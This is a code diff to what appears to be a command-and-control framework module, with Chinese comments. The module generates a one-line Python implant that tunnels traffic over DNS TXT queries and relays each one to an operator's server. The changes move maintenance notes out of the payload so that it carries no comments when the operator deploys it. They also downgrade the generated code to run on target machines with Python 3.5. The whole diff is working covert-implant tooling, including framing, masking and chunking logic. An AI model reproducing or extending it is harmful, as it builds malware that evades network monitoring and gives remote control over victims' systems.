@@ -2,6 +2,12 @@
 @module: agent_dns
 @desc: 生成 Agent_dns 一句话 python 载荷: 植入物 DNS 查询连入(UDP, TXT 分片), 每查询 TCP 帧中继到 server
 @params: host port [server_key_hex] [out_dir] [agent_id] [domain]
+
+载荷侧口径: 第一段由操作员手工部署(deploy_command), 不经 Task, 所以**载荷里不许有
+`#` 注释**(维护知识记在服务端, 2026-09-30)。
+要点: TXT 应答的帧必须带 4 字节掩码长度头(与 relay_code 的 S 同构)——implant 端
+recv_frame 第一步就读掩码头再按长度取帧体, 裸 E() 密文会被当头解析导致长度错乱、
+MAC 必败、整条 DNS 中继不可用(2026-09-04 修复)。
 """
 import json
 import os
@@ -9,6 +15,7 @@ import secrets
 
 from server.core.bootstrap import deploy_command
 from server.transports.agent_base import relay_code
+from server.core.pycompat import downgrade_py35
 
 MODULE = {
     "desc": "生成 Agent_dns 一句话 python 载荷(DNS UDP 隧道中继)",
@@ -62,9 +69,6 @@ def _btxt(qid,labels,qtype,chunks):
 def _hd(f):
  return _st.pack(">I", len(f) ^ int.from_bytes(h.sha256(_AK + b"len").digest()[:4], "big")) + f
 def _txtresp(qid,labels,qtype,frame,bid):
- # 帧须带 4 字节掩码长度头(与 relay_code 的 S 同构): implant 端 recv_frame
- # 第一步就读掩码头再按长度取帧体——裸 E() 密文会被当头解析,长度错乱
- # MAC 必败,整条 DNS 中继不可用(2026-09-04 修复)
  frame=_hd(frame)
  b32=_b32e(frame)
  chunks=[b32[i:i+60] for i in range(0,len(b32),60)]
@@ -167,6 +171,7 @@ def run(host, port, server_key_hex=None, out_dir=None, agent_id=None,
                       str(list(agent_key)).replace(" ", ""),
                       host, port, via, long_lived=False)
     code += _LISTEN_CODE.replace("_LP", str(listen_port))
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<agent_dns>", "exec")  # 生成即校验
 
     command = deploy_command(code)
